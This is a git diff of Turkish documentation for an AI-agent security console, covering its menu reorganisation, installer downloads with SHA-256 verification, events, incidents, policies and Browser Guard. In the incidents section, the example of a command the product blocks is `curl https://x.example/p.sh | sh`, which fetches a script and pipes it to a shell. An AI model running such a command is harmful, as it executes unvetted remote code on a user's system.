@@ -21,18 +21,18 @@ Compose veya Kubernetes kurulumu ve air-gapped (internetten yalıtılmış) kuru
 1. [Kontrol düzleminin yeri](#1-kontrol-düzleminin-yeri)
 2. [Yönetim konsolu: rota haritası](#2-yönetim-konsolu-rota-haritası)
 3. [Yönetim konsolu özellikleri](#3-yönetim-konsolu-özellikleri)
-   - [Onboarding (Connect)](#onboarding-connect)
-   - [Bağlayıcı indirme merkezi](#bağlayıcı-indirme-merkezi)
+   - [Onboarding (ilk kurulum)](#onboarding-ilk-kurulum)
+   - [Kurulum dosyası ve paket indirmeleri (Downloads)](#kurulum-dosyası-ve-paket-indirmeleri-downloads)
    - [Genel bakış paneli](#genel-bakış-paneli)
-   - [Olaylar (Events)](#olaylar-events)
-   - [Olası olaylar ve kanıt zinciri](#olası-olaylar-ve-kanıt-zinciri)
+   - [Etkinlik akışı](#etkinlik-akışı)
+   - [Güvenlik vakaları ve kanıt zinciri](#güvenlik-vakaları-ve-kanıt-zinciri)
    - [Ajanlar ve ajan ayrıntısı](#ajanlar-ve-ajan-ayrıntısı)
    - [Keşif kapsamı (Discovery)](#keşif-kapsamı-discovery)
    - [Yapay Zekâ Güvenlik Duruşu (AI Security Posture)](#yapay-zekâ-güvenlik-duruşu-ai-security-posture)
    - [Ekip politikası ve çalışma zamanı politikası](#ekip-politikası-ve-çalışma-zamanı-politikası)
    - [Kademeli politika dağıtımı ve geri alma](#kademeli-politika-dağıtımı-ve-geri-alma)
    - [DLP politika düzenleyicisi](#dlp-politika-düzenleyicisi)
-   - [Tarayıcı gizliliği (Browser Privacy)](#tarayıcı-gizliliği-browser-privacy)
+   - [Browser Guard sayfası](#browser-guard-sayfası)
    - [Yapay zekâ yönetişimi: varlık envanteri, talep, istisna ve değişiklik denetimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi)
    - [Yönetişim skor kartı, çerçeve eşlemesi ve zamanlanmış özet](#yönetişim-skor-kartı-çerçeve-eşlemesi-ve-zamanlanmış-özet)
    - [AutoSecOps görünümü ve müdahale playbook'ları](#autosecops-görünümü-ve-müdahale-playbookları)
@@ -122,29 +122,38 @@ kontrol eder; süresi dolmuşsa `/login` sayfasına yönlendirir. Boşta kalan o
 belirli bir hareketsizlik süresinden sonra tarayıcıda sonlanır. Rotalar
 `packages/dashboard/src/main.tsx` içinde tanımlıdır:
 
+Menü işe göre gruplanır: **Genel bakış**, **Koruma**, **Onaylar ve vakalar**,
+**Cihazlar ve indirmeler**, **Yönetişim ve uyum** ve **Yönetim**. Her etiket, açtığı
+sayfanın başlığıdır. Konsol Türkçe ve İngilizce kullanılabilir (aşağıda: Türkçe /
+İngilizce).
+
 | Rota | Menü etiketi | Ne için | Bölüm |
 | --- | --- | --- | --- |
-| `/onboarding` | Connect | Çalışma alanı oluşturma, deneme başlatma, çalışma zamanı seçimi, cihaz onayı | [Onboarding](#onboarding-connect) |
-| `/downloads` | Downloads | SHA-256 özetiyle doğrulanmış bağlayıcı indirmeleri | [İndirme merkezi](#bağlayıcı-indirme-merkezi) |
-| `/dashboard` | Dashboard | Filo sayaçları, canlı ajanlar, son olaylar | [Genel bakış](#genel-bakış-paneli) |
-| `/billing` | Billing | Mevcut plan, kabul edilen ajanlar, plan değişikliği talebi, faturalar | [Faturalama](#faturalama-ve-plan) |
-| `/api-keys` | API Keys | Tenant API anahtarları ve tek kullanımlık kayıt belirteçleri | [API anahtarları](#api-anahtarları-ve-kayıt-belirteçleri) |
-| `/agents`, `/agents/:agentId` | Agents | Kayıtlı kurulumlar, koltuk kullanımı, ajan bazında olaylar | [Ajanlar](#ajanlar-ve-ajan-ayrıntısı) |
-| `/events` | Events | Raporlanan son 500 karar olayı | [Olaylar](#olaylar-events) |
-| `/discovery` | Discovery | Raporlanan AI altyapı toplayıcıları ve hedefleri | [Keşif](#keşif-kapsamı-discovery) |
-| `/posture` | Posture | Altyapı CVE'leri, MCP riskleri, skill bulguları | [Yapay Zekâ Güvenlik Duruşu](#yapay-zekâ-güvenlik-duruşu-ai-security-posture) |
-| `/incidents` | Incidents | Engellenen ve onay bekleyen kararlar, kanıt zinciri | [Olası olaylar](#olası-olaylar-ve-kanıt-zinciri) |
-| `/approvals` | Approvals (sahip ve yöneticiler için bekleyen talep sayısı) | Yönetilen moddaki `ask` taleplerine gerekçeyle karar verme | [Panelden onay](01-ai-agent-security.md#panelden-onay) |
-| `/privacy-guard` | Browser Privacy | Browser Guard sayımları ve tarayıcı kaydı | [Tarayıcı gizliliği](#tarayıcı-gizliliği-browser-privacy) |
-| `/autosecops` | AutoSecOps | AutoSecOps entegrasyonundan çalışma zamanı filo görünümü | [AutoSecOps](#autosecops-görünümü-ve-müdahale-playbookları) |
-| `/settings` | Settings | Çalışma alanı adı, saklama süresi, kapatma, alarm bildirimleri, MFA durumu, tema | [Ayarlar](#çalışma-alanı-ayarları-ad-saklama-süresi-kapatma), [Alarm entegrasyonları](#alarm-entegrasyonları-slack-teams-imzalı-webhook-ve-e-posta) |
-| `/team` | Team | Üyeler, roller, davetler, ekip denetimi ve dışa aktarım | [Ekip](#ekip-roller-ve-davetler) |
-| `/scim` | Directory provisioning (yalnızca sahipler) | SCIM kimlik bilgileri ve grup-rol eşlemeleri | [SCIM](#scim-dizin-senkronizasyonu) |
-| `/policies` | Policies (politika düzenleyebilen roller) | Ekip politikası, çalışma zamanı politikası, dağıtım, DLP düzenleyicisi | [Politikalar](#ekip-politikası-ve-çalışma-zamanı-politikası) |
-| `/compliance` | Compliance (sahipler ve yöneticiler) | Uyum kanıt raporu (özetle mühürlü, isteğe bağlı imzalı): JSON, CSV paketi, yazdırılabilir TR/EN | [Uyum kanıt raporu](#uyum-kanıt-raporu) |
-| `/governance` | Governance (sahipler ve yöneticiler) | Yönetişim skor kartı, çerçeve kontrol matrisi, zamanlanmış özet ayarları | [Yönetişim skor kartı](#yönetişim-skor-kartı-çerçeve-eşlemesi-ve-zamanlanmış-özet) |
-| `/governance/register` | AI register | Yapay zekâ varlık envanteri | [Yapay zekâ yönetişimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi) |
-| `/governance/requests`, `/governance/change-control` | (AI register sayfasından) | Talepler ve istisnalar; dört göz politika değişikliği denetimi | [Yapay zekâ yönetişimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi) |
+| `/dashboard` | Genel bakış → Genel durum / Dashboard | Filo sayaçları, canlı ajanlar, son olaylar | [Genel bakış](#genel-bakış-paneli) |
+| `/events` | Genel bakış → Etkinlik akışı / Activity feed | Raporlanan son 500 karar olayı | [Etkinlik akışı](#etkinlik-akışı) |
+| `/discovery` | Genel bakış → Keşif / Discovery | Raporlanan AI altyapı toplayıcıları ve hedefleri | [Keşif](#keşif-kapsamı-discovery) |
+| `/posture` | Genel bakış → Güvenlik durumu / Security posture | Altyapı CVE'leri, MCP riskleri, skill bulguları | [Yapay Zekâ Güvenlik Duruşu](#yapay-zekâ-güvenlik-duruşu-ai-security-posture) |
+| `/policies` | Koruma → Ekip politikası / Team policy (politika düzenleyebilen roller) | Ekip politikası, çalışma zamanı politikası, dağıtım, DLP düzenleyicisi | [Politikalar](#ekip-politikası-ve-çalışma-zamanı-politikası) |
+| `/governance/detection-exceptions` | Koruma → Tespit istisnaları / Detection exceptions (sahipler ve yöneticiler) | Süreli tespit istisnaları | [Yapay zekâ yönetişimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi) |
+| `/privacy-guard` | Koruma → Browser Guard | Browser Guard sayımları, gölge yapay zekâ, yerel ad/adres denetimi ve tarayıcı kaydı | [Browser Guard sayfası](#browser-guard-sayfası) |
+| `/autosecops` | Koruma → AutoSecOps | AutoSecOps entegrasyonundan çalışma zamanı filo görünümü | [AutoSecOps](#autosecops-görünümü-ve-müdahale-playbookları) |
+| `/approvals` | Onaylar ve vakalar → Onaylar / Approvals (sahip ve yöneticiler için bekleyen talep sayısı) | Yönetilen moddaki `ask` taleplerine gerekçeyle karar verme | [Panelden onay](01-ai-agent-security.md#panelden-onay) |
+| `/incidents` | Onaylar ve vakalar → Güvenlik vakaları / Security incidents | Engellenen ve onay bekleyen kararlar, kanıt zinciri | [Güvenlik vakaları](#güvenlik-vakaları-ve-kanıt-zinciri) |
+| `/onboarding` | Cihazlar ve indirmeler → İlk kurulum / Onboarding | Çalışma alanı oluşturma, deneme başlatma, kurulum dosyası, cihaz onayı | [İlk kurulum](#onboarding-ilk-kurulum) |
+| `/downloads` | Cihazlar ve indirmeler → İndirmeler / Downloads | SHA-256 özetiyle doğrulanmış Windows ve Linux kurulum dosyaları, bağlayıcılar ve Browser Guard | [İndirmeler](#kurulum-dosyası-ve-paket-indirmeleri-downloads) |
+| `/agents`, `/agents/:agentId` | Cihazlar ve indirmeler → Yapay zekâ araçları / Agents | Kayıtlı kurulumlar, koltuk kullanımı, ajan bazında olaylar | [Ajanlar](#ajanlar-ve-ajan-ayrıntısı) |
+| `/api-keys` | Cihazlar ve indirmeler → API anahtarları / API keys | Tenant API anahtarları ve tek kullanımlık kayıt belirteçleri | [API anahtarları](#api-anahtarları-ve-kayıt-belirteçleri) |
+| `/governance` | Yönetişim ve uyum → Yapay zekâ yönetişimi / AI governance (sahipler ve yöneticiler) | Yönetişim skor kartı, çerçeve kontrol matrisi, zamanlanmış özet ayarları | [Yönetişim skor kartı](#yönetişim-skor-kartı-çerçeve-eşlemesi-ve-zamanlanmış-özet) |
+| `/governance/register` | Yönetişim ve uyum → Yapay zekâ varlık envanteri / AI asset register | Yapay zekâ varlık envanteri | [Yapay zekâ yönetişimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi) |
+| `/governance/requests`, `/governance/change-control` | (varlık envanteri sayfasından) | Talepler ve istisnalar; dört göz politika değişikliği denetimi | [Yapay zekâ yönetişimi](#yapay-zekâ-yönetişimi-varlık-envanteri-talep-istisna-ve-değişiklik-denetimi) |
+| `/compliance` | Yönetişim ve uyum → Uyum raporu / Compliance report (sahipler ve yöneticiler) | Uyum kanıt raporu (özetle mühürlü, isteğe bağlı imzalı): JSON, CSV paketi, yazdırılabilir TR/EN | [Uyum kanıt raporu](#uyum-kanıt-raporu) |
+| `/team` | Yönetim → Ekip / Team | Üyeler, roller, davetler, ekip denetimi ve dışa aktarım | [Ekip](#ekip-roller-ve-davetler) |
+| `/settings` | Yönetim → Ayarlar / Settings | Çalışma alanı adı, saklama süresi, kapatma, alarm bildirimleri, MFA durumu, tema | [Ayarlar](#çalışma-alanı-ayarları-ad-saklama-süresi-kapatma), [Alarm entegrasyonları](#alarm-entegrasyonları-slack-teams-imzalı-webhook-ve-e-posta) |
+| `/billing` | Yönetim → Faturalandırma / Billing | Mevcut plan, kabul edilen ajanlar, plan değişikliği talebi, faturalar | [Faturalama](#faturalama-ve-plan) |
+| `/sso` | Yönetim → Çoklu oturum açma (SSO) / Single sign-on (yalnızca sahipler) | Microsoft Entra ID ve SAML 2.0 ile oturum açma | [Tek oturum açma](#tek-oturum-açma-microsoft-entra-id-ve-saml-20) |
+| `/scim` | Yönetim → Dizin senkronizasyonu / Directory provisioning (yalnızca sahipler) | SCIM kimlik bilgileri ve grup-rol eşlemeleri | [SCIM](#scim-dizin-senkronizasyonu) |
+| `/retention` | Yönetim → Yasal saklama ve veri saklama / Legal holds and retention (sahipler ve yöneticiler) | Yasal saklama ve saklama süreleri | [Saklama](#9-saklama-yasal-saklama-ve-offboarding) |
+| `/siem` | Yönetim → SIEM aktarımı / SIEM export (politika düzenleyebilen roller) | SIEM teslimat ayarları | [SIEM teslimatı](#siem-teslimatı) |
 | `/enterprise` | yok (davet bağlantısında) | Davet kabulü | [Ekip](#ekip-roller-ve-davetler) |
 | `/auth/dlp-step-up` | yok | DLP ve çalışma alanı değişikliklerinden önce MFA doğrulaması | [MFA](#çok-faktörlü-doğrulama-kurtarma-ve-oturum-iptali) |
 | `/auth/recover` | yok | Parola kurtarma ve acil durum (break-glass) kurtarma kodları | [MFA](#çok-faktörlü-doğrulama-kurtarma-ve-oturum-iptali) |
@@ -158,12 +167,15 @@ anil@singularityrd.com üzerinden teklif talebi), `/pilot` (pilot başvurusu), `
 
 ## 3. Yönetim konsolu özellikleri
 
-### Onboarding (Connect)
+### Onboarding (ilk kurulum)
 
 **Ne yapar.** `/onboarding` yeni bir sahibi (owner) ilk korunan ajana kadar adım adım
 götürür. Önce bir ekip çalışma alanı oluşturursunuz, sunuluyorsa 14 günlük denemeyi
-başlatırsınız, ardından üç adımı tamamlarsınız: **1) Choose runtime**, **2) Download &
-connect**, **3) Authorize**.
+başlatırsınız. Önerilen adım **1) Yükleyiciyi indirip çalıştırın**: tek bir Windows ya
+da Linux kurulum dosyası bilgisayardaki desteklenen her yapay zekâ aracını korur.
+**Gelişmiş: elle kurulum ve cihaz yetkilendirme** bölümü bağlayıcı bazındaki yolu üç
+adımda sunar: **1) Yapay zekâ aracınızı seçin**, **2) İndirin ve bağlayın**,
+**3) Yetkilendirin**.
 
 **Neden önemli.** Başarısız dağıtımların çoğu "kuruldu" ile "raporluyor" arasında takılır.
 Bu sayfa doğru bağlayıcı indirmesini aynı ekibe ait cihaz koduyla eşleştirir. Böylece ilk
@@ -172,16 +184,21 @@ uç nokta imzalı bir yapılandırmayla doğru tenant'a yerleşir.
 **Nasıl çalışır.** Sayfa çalışma alanının kabul (admission) durumunu okur. Buna göre ya
 deneme teklifini (bulut kabul modu, owner rolü, kullanıcı başına bir deneme) ya da erişim
 durumunu gösterir. Seçilen çalışma zamanına göre süzülmüş
-[indirme merkezini](#bağlayıcı-indirme-merkezi) içerir. 3. adımda bir cihaz kodu
+[indirme merkezini](#kurulum-dosyası-ve-paket-indirmeleri-downloads) içerir. 3. adımda bir cihaz kodu
 (`device-start`) veya manuel kayıt belirteci üretebilirsiniz. Ajan kaydedemeyen roller
 için sayfa devre dışıdır.
 
 **Nasıl kullanılır.**
-1. Oturum açın ve **Connect** (`/onboarding`) sayfasını açın.
-2. Henüz çalışma alanınız yoksa **Create your team workspace** altında bir ad girin.
+1. Oturum açın ve **Cihazlar ve indirmeler** altında **İlk kurulum** (`/onboarding`)
+   sayfasını açın.
+2. Henüz çalışma alanınız yoksa **Ekip çalışma alanınızı oluşturun** altında bir ad girin.
 3. Deneme sunuluyorsa, operatörün kaydettiği Kullanım Koşulları ve Gizlilik sürümlerini
-   onaylayan kutuyu işaretleyin ve **Start 14-day trial · 1 agent** düğmesine basın.
-4. Çalışma zamanını seçin, yükleyiciyi indirip doğrulayın ve kurun.
+   onaylayan kutuyu işaretleyin ve **14 günlük denemeyi başlat · 1 yapay zekâ aracı**
+   düğmesine basın.
+4. Kurulum dosyasını indirin, SHA-256 değerini denetleyin, çalıştırın ve yapay zekâ
+   araçlarınızı yeniden başlatın. Tek bir bağlayıcı için gelişmiş bölümü açın, aracı
+   seçin, paketini indirip doğrulayın ve kurun. Elle kurulum sürüm anahtarını da bir kez
+   ister: `aidr setup --release-key <anahtar.pem>` (kurulum dosyası bunu kendisi yapar).
 5. Ajan bir kod gösterdiğinde bunu `/verify` sayfasında onaylayın. Buradan kod üretmeniz
    yalnızca manuel bir kayıt belirtecine ihtiyaç duyarsanız gerekir.
 
@@ -196,30 +213,47 @@ için sayfa devre dışıdır.
 | Tüm planlar (katalog özelliği `dashboard`). Deneme yalnızca bulutta. | Bulut, On-prem, Air-gapped | Güncel bir tarayıcıda web konsolu; bağlayıcılar kendi rehberlerine göre |
 
 **Sınırlamalar.** Deneme düğmesi yalnızca `cloud` kabul modunda, yalnızca sahiplere ve
-daha önce deneme kullanmamış kullanıcılara görünür. Bağlayıcı kurulumu hâlâ çalışma
-zamanına özgü bir adımdır; evrensel bir MDM yükleyicisi sunulmaz.
+daha önce deneme kullanmamış kullanıcılara görünür. Kurulum dosyaları yalnızca Windows ve
+Linux için sunulur; macOS bağlayıcı paketlerini kullanır. Codex hook'larına Codex'te
+`/hooks` ile güven verilmesi, Cursor ve VS Code'da "Singularity AIDR: Enable protection"
+çalıştırılması gerekir; `aidr status` böyle her adımı gösterir.
 
-### Bağlayıcı indirme merkezi
+### Kurulum dosyası ve paket indirmeleri (Downloads)
 
-**Ne yapar.** `/downloads`, yayımlanan sürümün bağlayıcı paketlerini listeler: Claude
-Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, AIDR CLI, Chrome ve Edge için
-Browser Guard, Firefox için Browser Guard ve MCP gateway. Her kayıtta dosya adı, boyut ve
-SHA-256 özeti görünür. O çalışma zamanından bir ajan raporlama yaptığında çalışma zamanı
-"algılandı" olarak işaretlenir.
+**Ne yapar.** `/downloads` (**İndirmeler**) indirme portalıdır. Ziyaretçinin işletim
+sistemini algılar ve uygun **Windows ya da Linux kurulum dosyasını** (MSI, `.deb`, `.rpm`,
+tarball) boyutu, SHA-256 değeri ve kopyalanabilir sağlama komutuyla en üstte sunar; diğer
+platformları da listeler. macOS ziyaretçileri macOS kurulum dosyası olmadığını ve Browser
+Guard'ın macOS'ta çalıştığını görür. Altta Browser Guard mağaza bağlantıları (**Chrome'a
+ekle**, **Edge'e ekle**, **Firefox'a ekle**) ve BT ilkesi için uzantı kimlikleri, **BT /
+MDM dağıtımı** kartı ve **Tek tek bağlayıcı paketleri (gelişmiş)** bölümü yer alır: Claude
+Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, AIDR CLI, Chrome ve Edge için Browser
+Guard, Firefox için Browser Guard ve MCP gateway; her birinde dosya adı, boyut ve SHA-256
+özeti görünür ve o çalışma zamanından bir ajan raporlama yaptığında "algılandı" olarak
+işaretlenir.
 
 **Neden önemli.** Kurcalanmış bir yükleyici, bir güvenlik ürününü daha çalışmaya
 başlamadan etkisiz bırakabilir. Merkez yöneticilere tam özeti ve kopyalanabilir doğrulama
 komutlarını verir; doğrulayamadığı hiçbir şeyi göstermez.
 
-**Nasıl çalışır.** Konsol bir sürüm manifestini ya konsol sunucusundan
+**Nasıl çalışır.** Kurulum dosyaları `installer-download` Edge Function'ından gelir:
+etkin bir lisansı, denemesi ya da pilotu olan bir tenant'ın oturum açmış etkin üyesini
+ister, imzalı kurulum kataloğunu doğrular, bir `installer.download` denetim kaydı yazar
+ve ancak ondan sonra kısa ömürlü imzalı bir adres döndürür; imza denetiminden geçemeyen
+bir katalogla hiçbir şey sunulmaz. Kayıtlı uç noktalar aynı imzalı kataloğa `aidr update`
+için `installer-update` üzerinden ulaşır. Gelişmiş bağlayıcı listesi için konsol bir
+sürüm manifestini ya konsol sunucusundan
 (`AIDR_RELEASE_MANIFEST_PATH`) ya da harici bir HTTPS adresinden
 (`VITE_AIDR_RELEASE_MANIFEST_URL`) yükler. Manifest tarayıcıda da doğrulanır: `http:` bir
 bağlantı, eksik bir özet, bilinmeyen bir alan veya 1 MiB'ı aşan bir manifest reddedilir.
-Ayrık (detached) imza yayımlanmışsa ona bağlantı verilir.
+Ayrık (detached) imza yayımlanmışsa ona bağlantı verilir. Operatör ayrıntıları:
+[download-portal.tr.md](../../../installation/download-portal.tr.md).
 
-**Nasıl kullanılır.** **Downloads** sayfasını açın, çalışma zamanını seçin, dosyayı
-indirin ve **Verify the download before installing** altındaki komutu çalıştırın.
-Doğrulama başarısızsa kurmayın.
+**Nasıl kullanılır.** **İndirmeler** sayfasını açın, bu bilgisayar için önerilen kurulum
+dosyasını indirin, sağlama komutunu çalıştırın (Windows'ta `True`, Linux'ta `OK` yazar) ve
+kurulum dosyasını çalıştırın; ardından yapay zekâ araçlarını yeniden başlatın. Tek bir
+bağlayıcı paketi için gelişmiş bölümü açın ve **Kurmadan önce indirilen dosyayı
+doğrulayın** altındaki komutu çalıştırın. Bir denetim başarısızsa kurmayın.
 
 **Örnek.** Firefox kaydı `SHA-256 3f…` gösterir. Yönetici listelenen `sha256sum`
 komutunu çalıştırır, özetler eşleşir ve dosya tarayıcı politikasıyla dağıtılır. Manifest
@@ -230,19 +264,21 @@ address, so downloads are withheld." uyarısını gösterirdi.
 
 | Plan | Dağıtım | Platform / işletim sistemi |
 | --- | --- | --- |
-| Tüm planlar | Bulut, On-prem, Air-gapped (manifest kendi konsol sunucunuzdan sunulur) | Web konsolu; bağlayıcıya göre Windows, macOS ve Linux indirmeleri |
+| Tüm planlar (kurulum dosyası indirmek etkin lisans, deneme ya da pilot ister) | Bulut, On-prem, Air-gapped (katalog ve manifest kendi kontrol düzleminizden sunulur) | Web konsolu; Windows ve Linux kurulum dosyaları (yayımlandığı yerde x64, arm64); bağlayıcıya göre paketler |
 
-**Sınırlamalar.** Özet, dosyanın manifestle bütünlüğünü kanıtlar; yayıncı kimliğini
-kanıtlamaz. Noterleme (notarization), kod imzalama ve MDM kabulü harici adımlar olarak
-kalır. Manifest yapılandırılmamışsa sayfa "No verified download is available for this
-deployment." mesajını gösterir.
+**Sınırlamalar.** Özet, dosyanın katalog ya da manifestle bütünlüğünü kanıtlar; yayıncı
+kimliğini kanıtlamaz; kurulum dosyalarının kendisi Authenticode ya da GPG ile imzalıdır.
+MDM kabulü harici bir adım olarak kalır. macOS kurulum dosyası sunulmaz. Bir operatör
+kurulum dosyası yayımlayana kadar sayfa "Bu kurulum için henüz bir yükleyici yayımlanmadı.
+Sürüm sorumlunuza danışın." der; bağlayıcı manifesti yapılandırılmamışsa gelişmiş liste
+"Bu kurulum için doğrulanmış bir indirme yok." mesajını gösterir.
 
 ### Genel bakış paneli
 
 **Ne yapar.** `/dashboard` oturum açıldıktan sonraki giriş sayfasıdır. Ajanlar, bağlı
 ajanlar, bekleyen kayıt belirteçleri, olaylar, deny ve ask için sayaçlar gösterir. Ayrıca
-en son görülen beş canlı ajanı ve son altı olayı listeler; yanında **Connect agent**,
-**Verify code** ve **Privacy settings** kısayolları bulunur.
+en son görülen beş canlı ajanı ve son altı olayı listeler; yanında **Yapay zekâ aracı
+bağla**, **Kodu doğrula** ve **Gizlilik ayarları** kısayolları bulunur.
 
 **Neden önemli.** Güvenlik sorumlusu, her ajanı tek tek açmadan uç noktaların raporlama
 yapıp yapmadığını ve engellemelerin artıp artmadığını bir bakışta görmek ister.
@@ -251,12 +287,13 @@ yapıp yapmadığını ve engellemelerin artıp artmadığını bir bakışta g�
 güvenlik (RLS) altında okur. Olay tabanlı sayaçlar son 500 olayı kapsar ve bu açıkça
 belirtilir. "Latest heartbeat", herhangi bir ajanın en yeni `last_seen` zamanıdır.
 
-**Nasıl kullanılır.** **Dashboard** sayfasını açın. Yeni uç nokta kaydetmek için
-**Connect agent**, bir cihaz kodunu onaylamak için **Verify code** düğmesini kullanın.
+**Nasıl kullanılır.** **Genel durum** sayfasını açın. Yeni uç nokta kaydetmek için
+**Yapay zekâ aracı bağla**, bir cihaz kodunu onaylamak için **Kodu doğrula** düğmesini
+kullanın.
 
 **Örnek.** Bir politika değişikliğinden sonra son 500 olay içinde **Deny** kutucuğu
-3'ten 41'e çıkar. İnceleyen kişi hangi aracın engellendiğini görmek için **Events**
-sayfasını açar.
+3'ten 41'e çıkar. İnceleyen kişi hangi aracın engellendiğini görmek için **Etkinlik
+akışı** sayfasını açar.
 
 **Kapsam.**
 
@@ -268,7 +305,7 @@ sayfasını açar.
 yalnızca uç noktalar temiz kararları da gönderiyorsa
 (`control_plane.send_clean_verdicts: true`) görünür.
 
-### Olaylar (Events)
+### Etkinlik akışı
 
 **Ne yapar.** `/events`, ekibin ajanlarından gelen son 500 olayı zaman, ajan, tür, karar
 ve özet sütunlarıyla listeler. Rozetler deny, ask ve allow kararlarının toplamını
@@ -283,7 +320,7 @@ Varsayılan raporlamada `ask` ve `deny` yüklenir; `allow` için temiz karar rap
 gerekir. Özetler yalnızca maskelemeden geçen alanları gösterir. Varsayılan
 `redact_mode: "hash"` ile komut ve URL metni SHA-256 özetleriyle değiştirilir.
 
-**Nasıl kullanılır.** **Events** sayfasını açıp **Refresh** düğmesine basın. `allow`
+**Nasıl kullanılır.** **Etkinlik akışı** sayfasını açıp **Refresh** düğmesine basın. `allow`
 kararlarını da toplamak için uç nokta yapılandırmasında
 `control_plane.send_clean_verdicts` değerini `true` yapın.
 
@@ -300,7 +337,7 @@ kararlarını da toplamak için uç nokta yapılandırmasında
 [denetim dışa aktarımını](#8-denetim-dışa-aktarımı-ve-siem-teslimatı) veya SIEM
 teslimatını kullanın. Olayların görünmesi uç noktaların raporlama ayarlarına bağlıdır.
 
-### Olası olaylar ve kanıt zinciri
+### Güvenlik vakaları ve kanıt zinciri
 
 **Ne yapar.** `/incidents`, alınan engelleme (`deny`) ve onay gerektiren (`ask`)
 kararlardan ve eklenti tarama bulgularından türetilen olası güvenlik olaylarını gösterir.
@@ -317,10 +354,11 @@ olarak gösterilir. Bir zincir başı ancak bir arşiv o özet için kanıt dön
 `anchored` sayılır. Arşiv hedefi (archive sink) yapılandırılmamışsa `unanchored`
 (`no_archive_sink`) yazar.
 
-**Nasıl kullanılır.** **Incidents** sayfasını açın, engellenen ve onay bekleyen sayıları
+**Nasıl kullanılır.** **Güvenlik vakaları** sayfasını açın, engellenen ve onay bekleyen sayıları
 inceleyin, soruşturduğunuz cihaz ve korelasyon kimliğinin kanıt grubunu genişletin.
-`ask` onayları konsoldan veya ajandan değil, operatör CLI'ı (`aidr pending`,
-`aidr approve <actionId>`) ile bant dışında verilir.
+Bu sayfada onay düğmesi yoktur. Bir `ask` isteğini bir kişi kendi terminalinde
+(`aidr pending`, ardından `aidr approve <kimliğin ilk 8 karakteri>`) ya da yönetilen modda
+**Onaylar** sayfasında onaylar; yapay zekâ aracı asla onaylayamaz.
 
 **Örnek.** Bir ajan `curl https://x.example/p.sh | sh` çalıştırmaya çalışır. Uç nokta
 bunu engelleyip `deny` raporlar. Liste "1 blocked" gösterir; kanıt zinciri cihaz
@@ -352,7 +390,7 @@ gelir. Koltuk kullanımı okunamazsa sayfa bunu açıkça söyler; sınırı tah
 Browser Guard çalıştıran bir tarayıcı profili de diğer bağlayıcılar gibi bir ajan koltuğu
 sayılır.
 
-**Nasıl kullanılır.** **Agents** sayfasını açın; ayrıntı ve olaylar için satırdaki
+**Nasıl kullanılır.** **Yapay zekâ araçları** sayfasını açın; ayrıntı ve olaylar için satırdaki
 **View** düğmesini kullanın. Yeni ajan eklemek için **Onboarding** sayfasına gidin.
 
 **Örnek.** "Allowed: 25. Recorded: 25." Ardından 26. uç nokta raporlama yapmaya çalışır
@@ -491,13 +529,13 @@ listeleridir. Eski bir sürümün üzerine yazma girişimi `409` döndürür. Ba
 yayımlanan denetimleri bir sonraki yenilemede çeker ve bir yükleme makbuzu (load receipt)
 raporlar.
 
-**Nasıl kullanılır.** **Policies** sayfasını açın. Owner, admin ve member rolleri YAML
+**Nasıl kullanılır.** **Ekip politikası** sayfasını açın. Owner, admin ve member rolleri YAML
 taslaklarını yazıp kaydedebilir. Ardından owner veya admin **Compile saved YAML (dry
 run)** ile sonucu inceler ve **Compile and publish saved YAML** ya da **Publish runtime
 policy JSON** ile yayımlar.
 
 **Örnek.** `{"mcp_unknown": "ask"}` yayımlarsınız. Bir ajan izin listesi dışındaki bir MCP
-sunucusunun aracını bir sonraki çağırışında bağlayıcı çağrıyı bant dışı onaya kadar
+sunucusunun aracını bir sonraki çağırışında bağlayıcı çağrıyı bir kişi onaylayana kadar
 engeller. Model yalnızca bir eylem kimliği içeren engelleme gerekçesini görür.
 
 **Kapsam.**
@@ -559,8 +597,8 @@ tespitler eklemenizi sağlar; örneğin proje kod adları veya iç müşteri kim
 
 **Nasıl çalışır.** Sunucu, `tenant_dlp_policies` tablosuna kaydetmeden önce motor şemasını
 ve tenant sahipliğini doğrular. Okuma ve kaydetme MFA (AAL2) gerektirir ve
-`/auth/dlp-step-up` sayfasını kullanır. Yalnızca owner veya admin kaydedebilir. `ask`,
-"bant dışı operatör onayına kadar engelle" anlamına gelir. Düzenleyicide onaylama veya
+`/auth/dlp-step-up` sayfasını kullanır. Yalnızca owner veya admin kaydedebilir. `ask`
+("onay iste (bir kişi onaylayana kadar engelle)") bir kişi onaylayana kadar engeller. Düzenleyicide onaylama veya
 kapatma düğmesi yoktur.
 
 **Nasıl kullanılır.** İstendiğinde kimlik doğrulayıcı uygulamanızla doğrulayın. Etiket,
@@ -581,7 +619,7 @@ ayrıca dağıtması gerekir. Mevcut bağlayıcı kancaları (hook) yalnızca y�
 araç **girdisini** inceler. Çıktı yönündeki kurallar orada uygulanmaz; `redact` eşleşmesi
 de girdiyi yeniden yazmak yerine engellenir.
 
-### Tarayıcı gizliliği (Browser Privacy)
+### Browser Guard sayfası
 
 **Ne yapar.** `/privacy-guard`, Browser Guard'ın AI sohbet ürünlerine ulaşmadan önce 7
 veya 30 gün içinde neleri maskelediğini, uyardığını veya engellediğini raporlar.
@@ -602,10 +640,16 @@ gerisi atılır. Sayfa toplamları RLS altında
 `public.privacy_guard_summary(tenant, 7 | 30)` ile okur.
 
 **Nasıl kullanılır.**
-1. Browser Guard paketini Chrome, Edge veya Firefox'a dağıtın.
-2. **API Keys** sayfasında yazma yetkili bir tenant API anahtarı oluşturun.
-3. **Browser Privacy → Enroll browsers** altında koruma modunu (`auto`, `confirm`,
-   `block` veya `monitor`) seçin, politika JSON'unu kopyalayın, `apiKey` yer tutucusunu
+1. Browser Guard'ı Chrome, Edge veya Firefox'a dağıtın: liste dışı (unlisted) Chrome Web
+   Store ve Edge Eklentileri kayıtlarından (mağaza bağlantıları ve uzantı kimlikleri
+   **İndirmeler** sayfasında; güncellemeleri mağaza yapar) ya da mağazalara erişemeyen
+   ağlarda kendi HTTPS güncelleme kaynağınızdan sunulan kendi barındırdığınız paketle;
